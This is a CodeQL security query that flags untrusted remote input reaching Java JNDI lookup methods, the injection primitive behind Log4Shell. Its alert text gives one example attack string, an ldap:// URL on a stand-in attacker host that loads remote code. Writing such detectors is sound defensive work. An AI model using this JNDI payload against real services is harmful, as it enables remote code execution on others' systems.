/**
 * @name Tainted value flows into JNDI lookup
 * @description Tainted user input reaches `InitialContext.lookup` /
 *              `DirContext.lookup`. JNDI dereferences can fetch and
 *              deserialise remote objects (LDAP / RMI / CORBA) — the
 *              same primitive behind Log4Shell — enabling RCE.
 * @kind path-problem
 * @problem.severity error
 * @security-severity 9.0
 * @precision medium
 * @id java/jndi-injection
 * @tags external/cwe/cwe-74
 *       external/cwe/cwe-502
 *       security
 */

import java
import semmle.code.java.dataflow.FlowSources
import semmle.code.java.dataflow.TaintTracking
import JndiFlow::PathGraph

/** A JNDI lookup call. */
class JndiLookupCall extends MethodCall {
  JndiLookupCall() {
    this.getMethod().hasName(["lookup", "lookupLink", "doLookup"]) and
    this.getMethod().getDeclaringType().getASupertype*()
        .hasQualifiedName("javax.naming", ["Context", "InitialContext", "DirContext"])
  }
}

module JndiCfg implements DataFlow::ConfigSig {
  predicate isSource(DataFlow::Node n) { n instanceof RemoteFlowSource }

  predicate isSink(DataFlow::Node n) {
    exists(JndiLookupCall c | n.asExpr() = c.getArgument(0))
  }
}

module JndiFlow = TaintTracking::Global<JndiCfg>;

from JndiFlow::PathNode source, JndiFlow::PathNode sink
where JndiFlow::flowPath(source, sink)
select sink.getNode(), source, sink,
  "Tainted value reaches JNDI lookup — attacker can supply " +
  "ldap://attacker.example/Exploit to load and execute remote code. " +
  "Source: $@.",
  source.getNode(), "remote source"
